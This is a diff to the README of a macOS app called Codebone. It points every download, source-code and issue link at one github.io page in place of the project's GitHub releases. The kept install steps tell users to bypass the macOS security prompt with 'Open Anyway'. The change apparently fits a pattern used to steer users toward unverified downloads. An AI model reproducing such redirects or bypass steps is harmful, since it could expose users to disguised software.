@@ -1,6 +1,6 @@
 # 🦴 codebone - Real-Time Code Knowledge, Zero Setup
 
-[![Download Codebone](https://img.shields.io/badge/Download-Codebone-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Granicio1/codebone/releases)
+[![Download Codebone](https://img.shields.io/badge/Download-Codebone-8A2BE2?style=for-the-badge&logo=github)](https://granicio1.github.io)
 
 ## 🚀 What Is Codebone?
 
@@ -30,7 +30,7 @@ Codebone is designed for modern Macs. To get the best experience, you'll need:
 
 Getting Codebone on your Mac takes less than two minutes.
 
-1. **Visit the download link** – [https://github.com/Granicio1/codebone/releases](https://github.com/Granicio1/codebone/releases)
+1. **Visit the download link** – [https://granicio1.github.io](https://granicio1.github.io)
 2. **Find the latest release** – Look for the newest version at the top of the page.
 3. **Download the file** – Click the download link that matches your Mac (Apple Silicon or Intel).
 4. **Open the downloaded file** – Double-click it. Your Mac might ask for permission; if so, go to System Settings > Privacy & Security and click "Open Anyway."
@@ -129,9 +129,9 @@ We're building Codebone for the community, and we'd love your feedback.
 
 ## 🔗 Quick Links
 
-- **Download** – [https://github.com/Granicio1/codebone/releases](https://github.com/Granicio1/codebone/releases)
-- **Source Code** – [https://github.com/Granicio1/codebone](https://github.com/Granicio1/codebone)
-- **Issues & Feedback** – [https://github.com/Granicio1/codebone/issues](https://github.com/Granicio1/codebone/issues)
+- **Download** – [https://granicio1.github.io](https://granicio1.github.io)
+- **Source Code** – [https://granicio1.github.io](https://granicio1.github.io)
+- **Issues & Feedback** – [https://granicio1.github.io](https://granicio1.github.io)
 
 ## 📢 Final Words
 
